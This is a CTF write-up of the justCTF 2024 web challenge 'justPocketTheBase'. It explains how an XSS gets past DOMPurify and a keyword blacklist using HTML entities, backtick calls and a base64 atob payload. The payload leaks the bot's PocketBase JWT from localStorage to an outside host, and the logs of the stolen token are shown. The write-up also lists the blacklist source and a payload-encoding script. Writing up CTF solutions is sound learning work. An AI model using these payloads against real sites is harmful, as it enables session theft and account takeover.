---
title: "justPocketTheBase - justCTF 2024 teaser"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "blacklist", "xss", "jwt", "exiftool", "base64", "justctf-2024-teaser", "2024", "ctf-writeup"]
summary: "The thing I love the most about ready-to-use backends and frameworks is that they are always secure :)"
source:
  name: "CTFtime writeup #39252"
  url: "https://ctftime.org/writeup/39252"
original_source: "https://github.com/TeamAustria/writeups/blob/main/2024-justctf/justPocketTheBase.md"
ctf:
  name: "justCTF 2024 teaser"
  year: 2024
  challenge: "justPocketTheBase"
---

## Metadata

- **CTF:** justCTF 2024 teaser
- **Task:** justPocketTheBase
- **Author team:** Team Austria
- **CTFtime tags:** web, blacklist, xss
- **CTFtime:** <https://ctftime.org/writeup/39252>
- **Original writeup:** <https://github.com/TeamAustria/writeups/blob/main/2024-justctf/justPocketTheBase.md>

---
# justPocketTheBase

## Description  
```  
The thing I love the most about ready-to-use backends and frameworks is that they are always secure :)

-<http://justpocketthebase.web.jctf.pro>  
```

## Provided Files  
```  
\- justpocketthebase_docker.tar.gz  
```

## Writeup

> Credit to [Profiluefter](<https://github.com/profiluefter>) and [lavish](<https://github.com/lavish>) who worked together with me on this challenge.

We started off by taking a look at the website before inspecting the provided code.   
After creating an account we are able to create plants with a custom `title` and a custom `image` we provide which will be stored in the application and can be accessed via `/view-plant?id=[ID]`.   
Custom character-blacklist:   
```js  
let blacklist = [  
'window',  
'document',  
'cookie',  
'fetch',  
'navigator',  
'sendbeacon',  
'+',  
'_',  
'script',  
'!',  
'"',  
'#',  
'%',  
"'",  
'(',  
')',  
'*',  
'+',  
',',  
'-',  
'/',  
':',  
'?',  
'@',  
'[',  
']',  
';'  
];

const sanitizedTitle = DOMPurify.sanitize(plant.title);  
const newTitleElement = document.createElement('div');  
newTitleElement.classList.add('title');  
newTitleElement.innerHTML = sanitizedTitle;  
const safe = newTitleElement.innerText;  
try {  
if (blacklist.some((word) => safe.toLowerCase().includes(word))) {  
throw new Error('not safe!!!');  
}  
title.innerHTML = safe;  
} catch (err) {  
window.location.href = '/';  
}  
```

A reporting option on the website indicates a possible `XSS` vulnerabiltiy, so we analyzed the `sanitization-process` for the title element of a new post. 

The `dompurify` can be bypassed using [HTML-Entity-Characters](<https://html.com/character-codes/>) by simply encoding `<` and `>`.   
After the dompurify our input will be decoded meaning the same approach wouldn't work to bypass the `custom-blacklist`. 

It's possible to execute XSS via the `title` of a new plant by exchanging **()** with **``**.   
  
```js  
<img src=1 onerror=alert`1`>  
// < == <  
// > == >  
```  
Although this confirmed our suspicion, it didn't help much because the `custom-blacklist` still blocked valuable characters which we need. 

After knowing that we are successfully able to execute a `Cross-Site-Scripting-Attack` via title we were now searching for a possible way to bypass the `custom-blacklist` which disallows important characters like `/`.   
To find a way around this issue we tried an approach using a `base64` encoded payload which can be decoded using the `builtin` javascript function `atob` (ASCII to Binary).   
This would bypass the `custom-blacklist` as our encoded payload doesn't contain the actual characters like `/` or `:`.   
Using [PortSwigger-Cheatsheet](<https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#img-tag-with-base64-encoding>) we found a way to execute our encoded payload.   
```js  
<img src=1 onerror=location=atob`amF2YXNjcmlwdDpmZXRjaChgaHR0cHM6Ly9hcnl0My5kZXYvJHtsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgicG9ja2V0YmFzZV9hdXRoIil9YCk=`>  
```

Making a script to enchance efficiency:   
```py  
import base64

payload = 'JAVASCRIPT-PAYLOAD'

print(f'<img src=1 onerror=location=atob`{base64.b64encode(bytes(f"javascript:{payload}", "utf-8"))}`>')  
```

Leak localstorage which contains the JWT of the bot:   
```js  
<img src=1 onerror=location=atob`amF2YXNjcmlwdDpmZXRjaChgaHR0cHM6Ly9hcnl0My5kZXYvJHtsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgicG9ja2V0YmFzZV9hdXRoIil9YCk=`>

// fetch(`https://aryt3.dev/${localStorage.getItem("pocketbase_auth")}`)  
```

Server Logs after reporting the webpage:   
```  
167.71.14.123 - - [15/Jun/2024:13:54:43 +0200] "GET /%7B%22token%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb2xsZWN0aW9uSWQiOiJfcGJfdXNlcnNfYXV0aF8iLCJleHAiOjE3MTk2NjIwODIsImlkIjoiZWJtN3dvZnk5OW5tYjRiIiwidHlwZSI6ImF1dGhSZWNvcmQifQ.LqdYoqEO8cDmOgertTUt5FsmP6jUfDM0Z-GEbEJwBkc%22,%22model%22:%7B%22avatar%22:%22%22,%22collectionId%22:%22_pb_users_auth_%22,%22collectionName%22:%22users%22,%22created%22:%222024-06-15%2010:52:23.378Z%22,%22email%22:%22%22,%22emailVisibility%22:false,%22id%22:%22ebm7wofy99nmb4b%22,%22name%22:%22%22,%22updated%22:%222024-06-15%2010:52:23.378Z%22,%22username%22:%22flag%22,%22verified%22:false%7D%7D HTTP/1.1" 502 559 "http://localhost/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.0.0 Safari/537.36"  
```

URL-Decoded:  
```json  
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb2xsZWN0aW9uSWQiOiJfcGJfdXNlcnNfYXV0aF8iLCJleHAiOjE3MTk2NjI2OTcsImlkIjoiZWJtN3dvZnk5OW5tYjRiIiwidHlwZSI6ImF1dGhSZWNvcmQifQ.hSvcypOCNSsIYeXJ-JZE4H7vWnt7UFvrzAoMBkxwVp0","model":{"avatar":"","collectionId":"_pb_users_auth_","collectionName":"users","created":"2024-06-15 10:52:23.378Z","email":"","emailVisibility":false,"id":"ebm7wofy99nmb4b","name":"","updated":"2024-06-15 10:52:23.378Z","username":"flag","verified":false}}  
```

Having obtained the whole localstorage-item `pocketbase_auth`, we switched ours with this one.   
After that we were able to access the post with the `flag-image` and download the picture.   
Afterwards we inspected the image in the `admin-post` which revealed the flag and concludes this writeup.   
```sh  
$ exiftool flag_gygEshYymV.png   
ExifTool Version Number : 12.76  
File Name : flag_gygEshYymV.png

\---------------------------------------------------------

Artist : justCTF{97603333-6596-43fe-aef8-a134c1cc11b4}  
```
